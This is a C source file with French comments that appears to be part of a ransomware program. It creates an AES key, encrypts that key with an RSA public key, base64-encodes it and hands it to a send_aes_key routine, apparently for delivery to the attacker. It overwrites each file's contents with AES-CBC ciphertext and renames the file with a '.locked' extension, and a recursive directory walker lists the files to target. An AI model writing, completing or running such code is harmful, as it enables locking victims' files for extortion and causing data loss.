#include <stdio.h>
#include <stdlib.h>
#include "encrypt.h"

void handleErrors(const char *error) {
    fprintf(stderr, "Erreur : %s\n", error);
    exit(EXIT_FAILURE);
}

char *base64_encode(const unsigned char *input, int length){
    int output_length = 4 * ((length + 2) / 3);
    char *encoded = malloc(output_length + 1);
    if (!encoded) return NULL;

    EVP_EncodeBlock((unsigned char *)encoded, input, length);
    return encoded;
}

void encrypt_aes_key(const char *public_key_file, unsigned char *aes_key, unsigned char *encrypted_key, size_t *encrypted_key_len){
    EVP_PKEY *pkey;
    EVP_PKEY_CTX *ctx;
    FILE *pub_file = fopen(public_key_file, "rb");
    if (!pub_file) handleErrors("fopen (clé publique)");
    pkey = PEM_read_PUBKEY(pub_file, NULL, NULL, NULL);
    fclose(pub_file);
    if (!pkey) handleErrors("PEM_read_PUBKEY");

    ctx = EVP_PKEY_CTX_new(pkey, NULL);
    if (!ctx) handleErrors("EVP_PKEY_CTX_new");

    if (EVP_PKEY_encrypt_init(ctx) <= 0) handleErrors("EVP_PKEY_encrypt_init");
    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) handleErrors("EVP_PKEY_CTX_set_rsa_padding");

    if (EVP_PKEY_encrypt(ctx, NULL, encrypted_key_len, aes_key, AES_KEY_SIZE) <= 0) handleErrors("EVP_PKEY_encrypt");

    if (EVP_PKEY_encrypt(ctx, encrypted_key, encrypted_key_len, aes_key, AES_KEY_SIZE) <= 0) handleErrors("EVP_PKEY_encrypt");

    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(pkey);
}

unsigned char *create_key(void){
    unsigned char *aes_key = (unsigned char *)malloc(AES_KEY_SIZE);
    unsigned char iv[AES_BLOCK_SIZE];
    unsigned char encrypted_key[256];
    size_t encrypted_key_len;
    char *base64_key_aes;

    RAND_bytes(aes_key, AES_KEY_SIZE);
    RAND_bytes(iv, AES_BLOCK_SIZE);

    encrypt_aes_key("./config/public.pem", aes_key, encrypted_key, &encrypted_key_len);

    base64_key_aes = base64_encode((const unsigned char *)encrypted_key, encrypted_key_len);
    send_aes_key(base64_key_aes);
    free(base64_key_aes);

    return aes_key;
    //encrypt_file("plaintext.txt", "encrypted.dat", aes_key, iv);
}

void encrypt_file(const char *filepath, unsigned char *aes_key) {
    char new_filepath[256];
    unsigned char iv[AES_BLOCK_SIZE];
    unsigned char buffer[CHUNK_SIZE] = {0};
    EVP_CIPHER_CTX *ctx;
    size_t read_bytes;
    unsigned char ciphertext[CHUNK_SIZE + AES_BLOCK_SIZE]; // Prévoir padding
    int len, ciphertext_len;

    FILE *file = fopen(filepath, "rb+");
    if (!file) handleErrors("fopen");
    
    RAND_bytes(iv, AES_BLOCK_SIZE);
    
    read_bytes = fread(buffer, 1, CHUNK_SIZE, file);

    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, iv);

    EVP_EncryptUpdate(ctx, ciphertext, &len, buffer, read_bytes);
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
    ciphertext_len += len;

    fseek(file, 0, SEEK_SET);
    fwrite(iv, 1, AES_BLOCK_SIZE, file);  // Stocke l'IV
    fwrite(ciphertext, 1, ciphertext_len, file); // Stocke les données chiffrées

    EVP_CIPHER_CTX_free(ctx);
    fclose(file);
    snprintf(new_filepath, sizeof(new_filepath), "%s.locked", filepath);
    rename(filepath, new_filepath);
}

void list_files(const char *base_path){
    struct dirent *dp;
    char path[1024];
    struct stat path_stat;
    DIR *dir = opendir(base_path);

    if (!dir) return;

    while ((dp = readdir(dir)) != NULL) {
        if (strcmp(dp->d_name, ".") == 0 || strcmp(dp->d_name, "..") == 0)
            continue;
        
        snprintf(path, sizeof(path), "%s/%s", base_path, dp->d_name);
        stat(path, &path_stat);
        if (S_ISDIR(path_stat.st_mode)) {
            printf("[Dossier] %s\n", path);
            list_files(path);
        } else {
            printf("[Fichier] %s\n", path);
        }
    }
    closedir(dir);
}